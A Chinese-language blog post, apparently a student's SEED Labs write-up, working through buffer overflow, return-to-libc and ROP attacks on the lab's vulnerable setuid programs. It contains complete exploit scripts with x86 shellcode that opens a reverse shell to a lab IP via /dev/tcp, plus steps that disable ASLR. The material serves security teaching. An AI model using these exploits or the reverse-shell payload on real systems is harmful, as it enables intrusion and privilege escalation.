---
title: "SeedLab BufferOverFlow"
subtitle: "不会有人没做过seedlab吧"
layout: post
author: "Zhuhai"
header-style: text
tags:
  - seedlabs
---

# lab1 SeedLab - Buffer Over Flow

## task 1 Get familiar with shell code

根据老师课堂讲解， shell code 的主要作用是调用 execve syscall，可以执行我们预先设定好的命令，例如这里事先给的命令为
`"/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *"`，为三条命令。由于修改命令长度将导致二进制代码的错误，所以后续的命令长度需要和前者保持一致，用空格进行补齐。

## task 2 L1 attack
首先根据提示，输入命令 ` sudo sysctl -w kernel.randomize_va_space=0` 来关闭地址随机化。
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102135143.png)

该 task 给出了 ebp 和 buffer 的地址，输入 `echo hello | nc 10.0.9.5 9090` 可以查看。
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102135323.png)
接下来更改已经写好一部分的 `exploit.py`，代码如下

```py

#!/usr/bin/python3
import sys

shellcode= (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   #"/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL   # Put the shellcode in here
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517-len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffd148+8     # Change this number 
offset = 0x74              # Change this number 

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

代码解读：
1. 其中，shell code 放在最顶端，即开始位置在 `517 - len(shellcode)`。
2. ret 为 `ebp + 8` 以上的任意位置都可以（小于shell code），因为上面全被 NOP 覆盖，所以总能到达 shell code。
3. offset = ebp - start(buffer) + 4 = 0x74
4. shell code 中的命令行改为反向 shell 需要的命令。

执行 `./exploit.py`，获得 `badfile`。
用`nc -lnv 9090` 监听9090端口，并执行 ` cat badfile | nc 10.9.0.5 9090` 将 `badfile` 发送到 docker ，即得。
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102136264.png)

## task 3 L2 attack

该任务和前者唯一的区别在于没有给出 ebp 的位置，但告诉了我们`But the range is known [100, 300]`，于是我们可以暴力尝试，将ret填满整个空间即可。简单修改`exploit.py`即得。这里注意 ret 的位置应该始终在 buffer 之上，即大于300。
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102136890.png)
```py

#!/usr/bin/python3
import sys

shellcode= (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   #"/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL   # Put the shellcode in here
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517-len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffd038+308     # Change this number 

# 循环填入 ret
for offset in range(100,304,4):
  content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

```
最终成功获得反向 shell 。
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102136195.png)


## task 4 Attack 64 bit (known Buffer Size)
成功截图如下：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102136961.png)

代码如下：
```py
#!/usr/bin/python3
import sys

shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   #"/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x00007fffffffdfb0     # Change this number 
offset = 216              # Change this number 

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

代码解读：
1. 根据提示，64位中 shell code 和 Pointer size 都不一样了。
2. shell code 仍然可以从 `shellcode_64.py` 中获得，而为了解决 Pointer values 的开头为0的问题，这里采用`little endian` 来使得 0 在高位，来避免 strcpy 的终止。
3. 这里我们将 shell code 放在 buffer 的起始位置，然后让 ret 指向该位置，offset = ebp - start(buffer) + 8 。

## task 5 L4 Smaller buffer size

成功截图：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102141033.png)

代码如下：
```py
#!/usr/bin/python3
import sys

shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   #"/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *"
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0x100               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x7fffffffde40+1904     # Change this number 
offset = 104              # Change this number 

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

代码解读：
1. 由于 buffer 的大小不足以放下 shellcode，所以将shell code 放置在上方 0x100 的位置。
2. 根据 stack.c 可以知道，内存中存放了一份 str 可以使用，这里将 ret 返回至 str 的 shell code 位置即可，于是需要找到该地址。
3. 使用 gdb 调试，在 shellcode 前写 "xxxxxxxx" 进行定位，获得其位置。
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102141101.png)
4. 由于 gdb 获得的地址和 echo hello 获得的地址有偏移，这里查看 gdb 中 ebp 的位置，并进行偏移的转换。
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102144466.png)
5. 最终，获得 ret = 0x7fffffffde40+1904，offset = ebp - start(buffer) + 8。

## task 6 Address Randomization 

首先打开地址随机化：
```
sudo /sbin/sysctl -w kernel.randomize_va_space=2
```
可以看到，在两次 echo hello 中，地址已经发生变化：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102144420.png)
这里可以采用暴力破解的方法，为了更容易地爆破到，将shell code 放置在栈的上方（高地址），使用 set-up 给出的 brute-force.sh 即可，在39168次时尝试成功：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102145216.png)


# Part B return to libc

## Task 1 2 3
首先通过命令行设置实验要求环境：
```shell
sudo sysctl -w kernel.randomize_va_space=0 //关闭栈初始化
sudo ln -sf /bin/zsh /bin/sh    // 绑定sh到zsh
gcc -m32 -DBUF_SIZE=N -fno-stack-protector -z noexecstack -o retlib retlib.c //编译
sudo chown root retlib  //更改权限
sudo chmod 4755 retlib  //更改权限
```
然后通过 gdb 查看 libc 中的 system、exit的地址：
```
touch badfile
gdb -q retlib
b main
r
p system
p exit
```
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102145604.png)
然后植入环境变量 `/bin/sh`：
```c
export MYSHELL=/bin/sh
env | grep MYSHELL
gcc getenv.c -o getenv
./getshell

//以下为getenv.c

#include<stdio.h>
#include<stdlib.h>

void main(){
	char* shell = getenv("MYSHELL");
	if (shell)
		printf("%x\n", (unsigned int)shell);
}

```
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102145282.png)

然后填入 exploit.py 中，关于X,Y,Z的位置，根据栈的关系，X为system()，在底部，其参数\bin\sh在顶部部，中间为调用而压栈的Z，exit()。
但是发现始终不对。于是改用libc中的\bin\sh：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102146759.png)
> 之后发现是 getenv 在编译时应该和 retlib 配置一样，即gcc -m32  -fno-stack-protector -z noexecstack -o getenv getenv.c
最后代码为：
```py
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = 0x1c+8
sh_addr = 0xf7f5c352       # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 0x1c+0
system_addr = 0xf7e12420   # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 0x1c+4
exit_addr = 0xf7e04f80     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

成功获取权限：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102147633.png)


## Task 4
首先更改对zsh的链接：
```shell
sudo ln -sf /bin/bash /bin/sh

```
然后找到 execv 的地址：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102147961.png)

然后编写exploit.py如下：
```py
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

bof_start = 0xffffcd60
input_start = 0xffffcda0


X = 0x1c+8
sh_addr = 0xffffd402      # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 0x1c+0
system_addr = 0xf7e994b0   # The address of execv()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 0x1c+4
exit_addr = 0xf7e04f80     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')


pathname = 0xffffd402
argv = input_start + 0x1c + 16
argv0 = 0xffffd402
argv1 = 0xffffd605
argv2 = 0x0

content[X+4:X+8] = (argv).to_bytes(4,byteorder='little')
content[X+8:X+12] = (argv0).to_bytes(4,byteorder='little')
content[X+12:X+16] = (argv1).to_bytes(4,byteorder='little')
content[X+16:X+20] = (argv2).to_bytes(4,byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```
代码解读：
1. 栈变成 execv -> exit -> argv -> argv[0] -> argv[1] -> argv[2]

最终获得权限：
![](a6.png)

# ROP

寻找gadget：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102153467.png)
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102155335.png)
并且再次获取一些libc的函数地址（包括setuid）：
![](https://raw.githubusercontent.com/Zhuhai0247/blog-img/master/202210102155156.png)
根据前面的知识，构造：
```py
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))


bias = 0x1c
input_start = 0xffffcdc0
bof_start = 0xffffcd90
zero = 0x0


gadget1 = 0x565563a5   # gadget 1 
content[bias:bias+4] = (gadget1).to_bytes(4,byteorder='little')

ecx = input_start + bias + 20 + 4    
 
#ecx
content[bias+4:bias+8] = (ecx).to_bytes(4,byteorder='little')
#cut
content[bias+16:bias+20] = (zero).to_bytes(4,byteorder='little')


set_uid = 0xf7e99e30
system = 0xf7e12420
exit = 0xf7e04f80
nop = 0x56556442
shell = 0xf7f5c352


X = bias+20
content[X:X+4] = (set_uid).to_bytes(4,byteorder='little') 
content[X+4:X+8] = (nop).to_bytes(4,byteorder='little') 
content[X+8:X+12] = (zero).to_bytes(4,byteorder='little')
content[X+12:X+16] = (system).to_bytes(4,byteorder='little')
content[X+16:X+20] = (exit).to_bytes(4,byteorder='little')
content[X+20:X+24] = (shell).to_bytes(4,byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```
